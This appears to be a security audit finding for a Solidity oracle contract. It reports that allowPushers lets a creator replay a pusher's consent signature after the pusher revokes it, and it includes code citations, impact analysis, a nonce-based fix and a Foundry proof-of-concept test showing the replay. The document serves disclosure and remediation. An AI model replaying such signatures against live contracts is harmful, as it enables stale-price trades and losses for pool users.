### Title
`allowPushers` consent signature is replayable within the deadline window, allowing a creator to silently re-establish a revoked pusher delegation and redirect the pusher's price writes away from their own namespace — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`CompressedOracleV1::allowPushers` verifies a pusher's EIP-191 consent signature but tracks no nonce and marks no signature as used. Within the deadline window the creator can replay the identical signature after the pusher has called `revokePusher()`, re-writing `namespaceRemapping[pusher] = creator` and silently redirecting every subsequent fallback push back into the creator's namespace. The pusher's own namespace receives nothing, leaving any pool that reads from it with a stale price.

---

### Finding Description

`allowPushers` signs over `(block.chainid, address(this), deadline, pusher, msg.sender)` and enforces only that `block.timestamp <= deadline`:

```solidity
// CompressedOracle.sol L192-211
function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
    _ensureDeadline(deadline);          // only checks deadline > now
    ...
    bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
        keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
    );
    require(pusher == ECDSA.recover(hash, signatures[i]));
    namespaceRemapping[pusher] = msg.sender;   // unconditional write
    emit PusherAuthorized(pusher, msg.sender);
}
```

`revokePusher` clears the mapping:

```solidity
// CompressedOracle.sol L238-243
function revokePusher() external {
    ...
    namespaceRemapping[msg.sender] = address(0);
    emit PusherRevoked(msg.sender, creator);
}
```

Because there is no nonce, no per-signature consumed flag, and no check that `namespaceRemapping[pusher]` is currently `address(0)` before writing, the creator can call `allowPushers` again with the exact same `(deadline, pusher, sig)` tuple at any point before the deadline expires. The code comment in the NatDoc acknowledges the risk ("an undated signature could re-establish a delegation AFTER the pusher revoked it") and treats the deadline as the mitigation — but the deadline only bounds the attack window; it does not prevent replay within that window.

The `fallback` push path resolves the namespace at call time:

```solidity
// CompressedOracle.sol L315-316
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
```

So every push the pusher makes after their revocation — intending to write to their own namespace — is silently redirected to the creator's namespace as long as the creator keeps replaying the delegation.

---

### Impact Explanation

The pusher's own namespace (`feedIdOf(pusher, slotIndex, positionIndex)`) receives no updates while the delegation is active. Any pool whose `IPriceProvider` is configured to read from the pusher's own namespace will observe a stale (or zero-timestamp) oracle value. A zero-timestamp slot is treated as stale by every consumer (`timestampMs = 0` → rejected as unpushed), and a previously valid but now frozen timestamp will eventually exceed `maxTimeDrift`, causing the provider to return a stale bid/ask to the pool. Swaps executed against a stale price cause traders to receive more output than the current market permits or the pool to receive less input than owed — a direct bad-price execution loss.

Additionally, the creator's namespace receives the pusher's price data without the pusher's consent, potentially corrupting the creator's own feeds if the pusher is pushing data for a different asset or at a different precision after the revocation.

---

### Likelihood Explanation

The attack requires:
1. A pusher who has signed a consent with a future deadline (normal operational setup).
2. The pusher calling `revokePusher()` before the deadline expires (e.g., to switch to their own namespace or to stop contributing).
3. The creator replaying the original `(deadline, pusher, sig)` tuple — a single public transaction with no privileged access.

The creator holds the signature from the original `allowPushers` call and can replay it at any time before the deadline. No leaked secrets or admin keys are required. The deadline window can be days or weeks depending on the off-chain tooling that generated the consent.

---

### Recommendation

Track consumed signatures with a `mapping(bytes32 => bool) private _usedConsents` keyed on the full signed hash, and revert if the hash has already been used:

```solidity
mapping(bytes32 => bool) private _usedConsents;

function allowPushers(...) external {
    _ensureDeadline(deadline);
    ...
    bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
        keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
    );
    require(!_usedConsents[hash], ConsentAlreadyUsed());
    _usedConsents[hash] = true;
    require(pusher == ECDSA.recover(hash, signatures[i]));
    namespaceRemapping[pusher] = msg.sender;
    ...
}
```

Alternatively, add a per-pusher nonce to the signed message so each consent is single-use by construction.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {CompressedOracleV1} from
    "smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract ReplayDelegationPoC is Test {
    CompressedOracleV1 oracle;

    uint256 constant CREATOR_KEY = 0xC0FFEE01;
    uint256 constant PUSHER_KEY  = 0xDEADBEEF;

    address creator;
    address pusher;

    function setUp() public {
        vm.warp(1_700_000_000);
        oracle  = new CompressedOracleV1(address(this), 5_000);
        creator = vm.addr(CREATOR_KEY);
        pusher  = vm.addr(PUSHER_KEY);
    }

    function testReplayAfterRevoke() public {
        uint256 deadline = block.timestamp + 1 days;

        // 1. Pusher signs consent
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        // 2. Creator establishes delegation
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator);

        // 3. Pusher revokes — expects to push to own namespace from now on
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0));

        // 4. Creator replays the SAME signature before deadline — delegation restored
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);   // no revert
        assertEq(oracle.namespaceRemapping(pusher), creator, "delegation re-established after revoke");

        // 5. Pusher's subsequent push lands in creator's namespace, not pusher's own
        uint56 tsMs = uint56(block.timestamp * 1000);
        bytes memory word = abi.encodePacked(
            uint256((uint256(tsMs) << 8) | uint256(0)) // slotId=0, ts=now
        );
        vm.prank(pusher);
        (bool ok,) = address(oracle).call(word);
        assertTrue(ok);

        // Pusher's own namespace is still empty — any pool reading it gets stale price
        assertEq(oracle.getOracleData(oracle.feedIdOf(pusher, 0, 0)).price, 0,
            "pusher own namespace stays stale");
    }
}
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L192-211)
```text
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L236-243)
```text
    /// @notice Allows a pusher to self-revoke their delegation. After revocation the
    ///         wallet pushes into its OWN namespace again (the registrationless default).
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L314-317)
```text

        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;

```

**File:** smart-contracts-poc/contracts/oracles/compressed/OracleBase.sol (L124-126)
```text
    function _ensureDeadline(uint256 deadline) internal view virtual {
        require(block.timestamp <= deadline, DeadlineExceeded());
    }
```
